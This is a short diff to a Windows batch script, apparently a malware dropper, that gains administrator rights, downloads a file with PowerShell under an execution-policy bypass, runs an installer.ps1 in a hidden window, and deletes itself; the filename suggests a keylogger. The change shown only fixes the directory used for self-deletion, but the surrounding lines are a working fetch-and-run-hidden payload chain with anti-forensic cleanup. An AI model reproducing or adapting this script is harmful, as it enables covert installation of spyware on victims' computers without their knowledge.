@@ -2,6 +2,8 @@
 REM get admin permissions for script
 REM created by: jfrdgh (@bigmanlc on dc)
 
+set "INITIALPATH=%cd%"
+
 :: BatchGotAdmin
 :-------------------------------------
 REM --> check for permissions
@@ -44,5 +46,5 @@ powershell -ExecutionPolicy Bypass -command "Invoke-WebRequest -Uri 'https://raw
 powershell powershell.exe -windowstyle hidden -ep bypass ./installer.ps1
 
 @REM self delete
-cd %STARTUP%
+cd %INITIALPATH%
 del GetAdmnInstKL.cmd
